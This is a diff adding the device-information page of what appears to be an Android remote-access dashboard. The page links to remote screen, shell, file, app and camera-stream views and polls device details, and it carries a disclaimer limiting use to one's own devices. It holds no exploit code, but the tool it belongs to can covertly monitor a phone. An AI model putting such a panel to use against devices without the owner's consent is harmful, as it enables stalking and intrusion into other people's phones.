@@ -1,0 +1,196 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Device Info - Remote Access</title>
+  <link rel="stylesheet" href="/css/hacker-theme.css">
+</head>
+
+<body>
+  <div class="container">
+    <a href="index.html" class="back-link">&lt;-- Back to Dashboard</a>
+    <header>
+      <h1>Device Information</h1>
+      <p>// system diagnostics</p>
+    </header>
+
+    <!-- Quick Actions -->
+    <div class="quick-actions" id="quick-actions" style="display:none;">
+      <a id="qa-screen" class="btn btn-primary">SCREEN</a>
+      <a id="qa-shell" class="btn btn-secondary">SHELL</a>
+      <a id="qa-files" class="btn btn-secondary">FILES</a>
+      <a id="qa-apps" class="btn btn-secondary">APPS</a>
+      <a id="qa-cam" class="btn btn-secondary">CAMERA</a>
+    </div>
+
+    <div id="device-info" class="info-grid">
+      <p class="loading">Querying device...</p>
+    </div>
+
+    <p class="timestamp" id="last-refreshed" style="text-align:center;margin-top:12px;"></p>
+  </div>
+
+  <script src="/js/api.js"></script>
+  <script>
+    const deviceId = new URLSearchParams(window.location.search).get('deviceId');
+
+    if (!deviceId) {
+      window.location.href = 'index.html';
+    }
+
+    // Setup quick action links
+    const qa = document.getElementById('quick-actions');
+    document.getElementById('qa-screen').href = `screen-stream.html?deviceId=${deviceId}`;
+    document.getElementById('qa-shell').href = `shell.html?deviceId=${deviceId}`;
+    document.getElementById('qa-files').href = `file-manager.html?deviceId=${deviceId}`;
+    document.getElementById('qa-apps').href = `apps.html?deviceId=${deviceId}`;
+    document.getElementById('qa-cam').href = `cam-stream.html?deviceId=${deviceId}`;
+    qa.style.display = 'flex';
+
+    async function loadDeviceInfo() {
+      try {
+        const response = await api.getDeviceInfo(deviceId);
+        if (response.success) {
+          renderDeviceInfo(response.device);
+          document.getElementById('last-refreshed').textContent =
+            `last updated: ${new Date().toLocaleTimeString()}`;
+        } else {
+          throw new Error(response.error || 'Failed to get device info');
+        }
+      } catch (error) {
+        document.getElementById('device-info').innerHTML = `
+          <p style="color: var(--danger);">Error: ${error.message}</p>
+        `;
+      }
+    }
+
+    function getBatteryColor(level) {
+      if (level > 50) return 'var(--accent)';
+      if (level > 20) return 'var(--warning)';
+      return 'var(--danger)';
+    }
+
+    function renderDeviceInfo(info) {
+      const container = document.getElementById('device-info');
+      const batteryLevel = parseInt(info.battery) || 0;
+      const batteryColor = getBatteryColor(batteryLevel);
+
+      container.innerHTML = `
+        <div class="info-card">
+          <h3>&#x1F4F1; Device Details</h3>
+          <div class="info-item">
+            <span class="info-label">Model</span>
+            <span class="info-value">${info.model || 'Unknown'}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Manufacturer</span>
+            <span class="info-value">${info.manufacturer || 'Unknown'}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Device ID</span>
+            <span class="info-value">${deviceId.substring(0, 12)}...</span>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <h3>&#x2699;&#xFE0F; System Info</h3>
+          <div class="info-item">
+            <span class="info-label">Android Version</span>
+            <span class="info-value">${info.androidVersion || 'N/A'}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">SDK Level</span>
+            <span class="info-value">${info.sdkLevel || 'N/A'}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Security Patch</span>
+            <span class="info-value">${info.securityPatch || 'N/A'}</span>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <h3>&#x1F50B; Battery</h3>
+          <div class="info-item">
+            <span class="info-label">Level</span>
+            <span class="info-value" style="color:${batteryColor}">${info.battery || '0'}%</span>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-fill" style="width: ${batteryLevel}%; background: linear-gradient(90deg, ${batteryColor}aa, ${batteryColor})"></div>
+          </div>
+          <div class="info-item" style="margin-top: 10px;">
+            <span class="info-label">Charging</span>
+            <span class="info-value">${info.isCharging ? '⚡ Yes' : 'No'}</span>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <h3>&#x1F4E1; Network</h3>
+          <div class="info-item">
+            <span class="info-label">Type</span>
+            <span class="info-value">${info.networkType || 'Unknown'}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Status</span>
+            <span class="info-value">${info.isConnected ? '● Connected' : '○ Disconnected'}</span>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <h3>&#x1F4BE; Storage</h3>
+          <div class="info-item">
+            <span class="info-label">Total</span>
+            <span class="info-value">${api.formatFileSize(info.storageTotal || 0)}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Used</span>
+            <span class="info-value">${api.formatFileSize(info.storageUsed || 0)}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Free</span>
+            <span class="info-value">${api.formatFileSize(info.storageFree || 0)}</span>
+          </div>
+          <div class="progress-bar">
+            <div class="progress-fill" style="width: ${((info.storageUsed || 0) / (info.storageTotal || 1) * 100)}%"></div>
+          </div>
+        </div>
+
+        <div class="info-card">
+          <h3>&#x1F9E0; Memory</h3>
+          <div class="info-item">
+            <span class="info-label">Total RAM</span>
+            <span class="info-value">${api.formatFileSize(info.memoryTotal || 0)}</span>
+          </div>
+          <div class="info-item">
+            <span class="info-label">Available</span>
+            <span class="info-value">${api.formatFileSize(info.memoryAvailable || 0)}</span>
+          </div>
+        </div>
+      `;
+    }
+
+    // Initial load
+    loadDeviceInfo();
+
+    // Auto-refresh every 10 seconds
+    setInterval(loadDeviceInfo, 10000);
+  </script>
+
+  <!-- Disclaimer -->
+  <div class="container">
+    <div class="disclaimer">
+      <h4>&#x26A0;&#xFE0F; Disclaimer</h4>
+      <p>This application is intended for EDUCATIONAL AND PERSONAL USE ONLY. It is designed for users to remotely manage their own devices. Installing or using this application on a device without the owner's explicit consent is illegal and unethical. The developers assume no liability for misuse. By using this application, you agree that you are solely responsible for how it is used.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <p class="footer-created">Created by</p>
+    <a href="https://thiyoplus-f.netlify.app/" target="_blank" class="footer-brand">thiyo-de</a>
+    <p class="footer-copy">&copy; 2025 All Rights Reserved</p>
+  </footer>
+</body>
+
+</html>
